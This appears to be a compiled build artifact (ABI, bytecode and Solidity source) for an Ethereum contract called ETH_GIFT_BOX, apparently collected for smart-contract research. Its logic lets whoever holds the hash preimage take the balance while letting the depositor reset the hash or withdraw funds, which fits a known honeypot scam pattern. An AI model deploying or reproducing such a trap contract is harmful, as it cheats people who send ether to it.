{
  "contractName": "ETH_GIFT_BOX",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_message",
          "type": "string"
        }
      ],
      "name": "SetMessage",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Revoce",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b506107ad8061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb0514610085578063181ffc5f146100a957806331fd725a1461015057806387f244841461018157806388fabb3a146101b4578063b456ecc51461021d578063cd8b02c8146102a2575b005b6100a760048036038101908080356000191690602001909291905050506102ac565b005b6100d5600480360381019080803590602001908201803590602001919091929391929390505050610339565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101155780820151818401526020810190506100fa565b50505050905090810190601f1680156101425780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561015c57600080fd5b5061017f6004803603810190808035600019169060200190929190505050610470565b005b34801561018d57600080fd5b506101966104f9565b60405180826000191660001916815260200191505060405180910390f35b3480156101c057600080fd5b5061021b600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506104ff565b005b34801561022957600080fd5b50610284600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610570565b60405180826000191660001916815260200191505060405180910390f35b6102aa6105dc565b005b600160009054906101000a900460ff161580156102d05750670de0b6b3a764000034115b806102e45750600060010260025460001916145b1561033657806002816000191690555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6060828260405180838380828437820191505092505050604051809103902060001916600254600019161415610469573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156103c6573d6000803e3d6000fd5b5060008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561045d5780601f106104325761010080835404028352916020019161045d565b820191906000526020600020905b81548152906001019060200180831161044057829003601f168201915b5050505050905061046a565b5b92915050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156104d65750600254600019168160001916145b156104f65760018060006101000a81548160ff0219169083151502179055505b50565b60025481565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561056d57806000908051906020019061056b9291906106dc565b505b50565b6000816040518082805190602001908083835b6020831015156105a85780518252602082019150602081019050602083039250610583565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156106da57600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156106b1573d6000803e3d6000fd5b506020604051908101604052806000815250600090805190602001906106d89291906106dc565b505b565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061071d57805160ff191683800117855561074b565b8280016001018555821561074b579182015b8281111561074a57825182559160200191906001019061072f565b5b509050610758919061075c565b5090565b61077e91905b8082111561077a576000816000905550600101610762565b5090565b905600a165627a7a72305820255d8a8884a2ee007be409e3ce6113851788e0e553b2255e9ebab0f6a99c506f0029",
  "source": "\n\ncontract ETH_GIFT_BOX\n{\n    string message;\n    \n    bool passHasBeenSet = false;\n    \n    bytes32 public hashPass;\n    \n    address sender;\n\t\n\tfunction() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n    }\n    \n    function SetMessage(string _message)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            message =_message;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    returns (string)\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n            return message;\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n            message=\"\";\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xb49b1dddf1b3d6e878fd9b73874da7ab0da7e004/contracts/0xb49b1dddf1b3d6e878fd9b73874da7ab0da7e004.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:04:14.085Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}